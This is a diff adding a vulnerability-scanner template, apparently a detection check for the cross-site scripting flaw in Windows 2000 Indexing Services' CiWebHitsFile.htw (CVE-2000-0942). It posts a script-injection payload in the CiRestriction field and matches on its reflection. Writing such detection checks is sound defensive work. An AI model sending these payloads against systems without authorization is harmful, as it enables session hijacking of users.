@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "检测 Windows 2000 中 Indexing Services 的 CiWebHitsFile 组件是否存在跨站脚本漏洞。通过向 .htw 请求发送恶意 CiRestriction 参数，验证是否能注入 JavaScript 并使其在用户会话中执行"
+id = "POC-AVE-2000-0689"
+name = "Microsoft Indexing Services Cross-Site Scripting"
+severity = "high"
+tags = ["ave-2000-0689"]
+vuln_id = [
+    "CVE-2000-0942",
+    "AVE-2000-0689",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/CiWebHitsFile.htw"
+protocol = "http"
+
+[poc.requests.body]
+type = "form"
+
+[poc.requests.body.content]
+CiRestriction = "<script>alert('XSS')</script>"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<script>",
+    "alert(",
+]
